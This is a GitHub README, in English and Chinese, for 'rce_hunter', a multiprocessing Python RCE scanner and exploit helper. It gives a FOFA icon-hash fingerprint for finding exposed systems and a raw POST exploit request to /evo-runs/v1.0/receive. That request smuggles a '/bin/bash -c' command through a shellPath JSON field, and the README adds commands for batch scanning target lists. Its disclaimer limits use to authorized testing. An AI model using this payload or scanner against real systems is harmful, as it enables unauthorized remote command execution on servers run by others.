# Python_RCE_DETECT_script
# rce_hunter - High-Performance RCE Scanner

<p align="left">
  <img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License">
  <img src="https://img.shields.io/badge/Python-3.x-yellow.svg" alt="Python">
  <img src="https://img.shields.io/badge/Platform-Cross--Platform-lightgrey.svg" alt="Platform">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red.svg" alt="Category">
  <img src="https://img.shields.io/badge/Status-Stable-success.svg" alt="Status">
</p>


                                   __                     __               
       _______ ___   ___    ______/ /_   __  __  ____    / /_ ___   _____  
      / ___/ // _ \ / _ \  / ___ / __ \ / / / // __ \   / __// _ \ / ___/  
     / /  / // ___//  __/ / /__ / / / // /_/ // / / /  / /_ /  __// /      
    /_/  /_/ \___/ \___/  \___//_/ /_/ \__,_//_/ /_/   \__/ \___//_/
    
🚀 A high-performance, multi-processing RCE scanner &amp; exploit helper written in Python. Specifically designed for fast, concurrent vulnerability scanning in isolated network environments.
一款高性能、多进程的RCE扫描器和漏洞利用辅助工具，采用Python编写。专为在隔离网络环境中快速并发进行漏洞扫描而设计。

Clone this repository and ensure you have requests installed:

    git clone https://github.com/JY-666-YINZI/Python_RCE_DETECT_script.git
    cd Python_RCE_DETECT_script
    pip install requests

FOFA:

    icon_hash="-1935899595"

POC：

    POST /evo-runs/v1.0/receive HTTP/1.1Host: Accept-Encoding: gzipConnection: keep-aliveContent-Length: 249Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36X-Subject-Headerflag: ADAPT
    { "method": "agent.ossm.mapping.config", "info": { "configure": "abcd", "filePath": "haha", "paramMap": { "shellPath": "/bin/bash -c df>/opt/evoWpms/static/macvguun.txt", "filePath": "abc" }, "requestIp": "" }}

Usage
Single Target Scan:

    python rce_hunter.py -u [http://example.com](http://example.com)

Batch Scanning from File:

    python rce_hunter.py -f urls.txt


⚡ 多进程并发： 采用 Python 原生 multiprocessing.Pool，并发上限可达 100 线程，轻松应对海量资产检测。

🛡️ 联动调试友好： 默认集成代理路由，轻松对接 Burp Suite 等抓包工具，便于实时监控发包特征。

📝 结果去重落盘： 检测结果自动去重并以追加写方式写入 2result.txt，保障日志完整性。

⚙️ 高容错设计： 完美兼容带端口、带协议或仅有主机的裸 URL 输入，并自带异常捕获，防卡死、防崩溃。

  快速上手
环境搭建
克隆该项目，并确保安装了 requests 依赖库：


    git clone https://github.com/JY-666-YINZI/Python_RCE_DETECT_script.git
    cd Python_RCE_DETECT_script
    pip install requests
命令行参数说明
检测单个目标：

    python Python_RCE_DETECT_script.py -u [http://192.168.1.1:8080](http://192.168.1.1:8080)
从文件批量载入并检测：

    python rce_hunter.py -f targets.txt

Disclaimer / 免责声明
This tool is developed strictly for authorized security auditing, vulnerability research, and incident response backup. The author assumes no liability for any unauthorized activities or damage caused by improper usage of this program.

本工具仅用于经授权的安全测试、漏洞自查及应急响应复盘，严禁用于任何未授权的渗透与破坏活动。使用本工具产生的任何后果由使用者本人承担。
